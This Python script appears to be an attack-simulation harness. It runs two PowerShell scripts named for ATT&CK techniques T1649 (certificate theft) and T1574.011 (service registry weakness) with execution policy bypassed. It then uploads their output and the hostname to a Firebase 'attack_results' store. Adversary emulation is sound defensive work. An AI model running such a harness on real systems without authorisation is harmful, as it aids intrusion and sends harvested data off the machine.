import subprocess
import os
import logging
from firebase_utils import initialize_firebase, send_data_to_firebase
import socket

# Günlük ayarları
logging.basicConfig(filename='run_scripts.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s:%(message)s')

# Scriptlerin tam yollarını belirleme
T1649_SCRIPT_PATH = os.path.abspath("../attack_scripts/t1649.ps1")
T1574_SCRIPT_PATH = os.path.abspath("../attack_scripts/t1574_011.ps1")

def get_computer_name():
    return socket.gethostname()

def run_powershell_script(script_path, params=""):
    try:
        completed_process = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", script_path] + params.split(),
            capture_output=True,
            text=True
        )
        return completed_process.stdout, completed_process.stderr
    except Exception as e:
        logging.error(f"Error running PowerShell script {script_path}: {str(e)}")
        return "", str(e)

def main():
    logging.info("Initializing Firebase...")
    try:
        initialize_firebase()
    except Exception as e:
        logging.error(f"Error initializing Firebase: {str(e)}")
        return

    computer_name = get_computer_name()

    # Run T1649 script
    logging.info("Running T1649 script...")
    t1649_output, t1649_error = run_powershell_script(T1649_SCRIPT_PATH)
    if t1649_error:
        logging.error(f"T1649 script error: {t1649_error}")
        send_data_to_firebase('/attack_results/T1649', {"output": t1649_error, "computer_name": computer_name})
    else:
        logging.info(f"T1649 script output: {t1649_output}")
        send_data_to_firebase('/attack_results/T1649', {"output": t1649_output, "computer_name": computer_name})

    # Run T1574 script with a parameter
    logging.info("Running T1574 script...")
    t1574_output, t1574_error = run_powershell_script(T1574_SCRIPT_PATH, "weak_service_name=weakservicename")
    if t1574_error:
        logging.error(f"T1574 script error: {t1574_error}")
        send_data_to_firebase('/attack_results/T1574', {"output": t1574_error, "computer_name": computer_name})
    else:
        logging.info(f"T1574 script output: {t1574_output}")
        send_data_to_firebase('/attack_results/T1574', {"output": t1574_output, "computer_name": computer_name})

if __name__ == "__main__":
    main()
